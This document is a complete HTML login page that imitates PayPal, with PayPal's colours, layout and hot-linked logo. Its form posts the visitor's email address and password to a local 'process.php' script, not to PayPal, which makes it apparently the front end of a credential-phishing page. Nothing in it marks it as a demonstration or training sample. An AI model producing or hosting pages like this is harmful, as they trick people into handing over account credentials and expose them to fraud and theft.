<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            padding: 40px 30px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            height: 30px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }
        .link {
            text-align: left;
            margin-bottom: 20px;
        }
        .link a {
            color: #0070ba;
            text-decoration: none;
            font-size: 14px;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background-color: #0070ba;
            color: white;
            border: none;
            border-radius: 24px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .or {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }
        .or::before, .or::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 45%;
            height: 1px;
            background-color: #ccc;
        }
        .or::before {
            left: 0;
        }
        .or::after {
            right: 0;
        }
        .or span {
            background: #fff;
            padding: 0 10px;
            position: relative;
            font-size: 14px;
        }
        .signup-btn {
            width: 100%;
            padding: 12px;
            border: 2px solid #000;
            border-radius: 24px;
            background-color: white;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" alt="PayPal">
        </div>
        <form action="process.php" method="POST">
            <input type="text" name="email" placeholder="Email address or mobile number" required>
            <div class="link">
                <a href="#">Forgotten your email address?</a>
            </div>
            <input type="password" name="password" placeholder="Password" required>
            <button class="btn" type="submit">Next</button>
        </form>
        <div class="or"><span>or</span></div>
        <button class="signup-btn">Sign Up</button>
    </div>
</body>
</html>
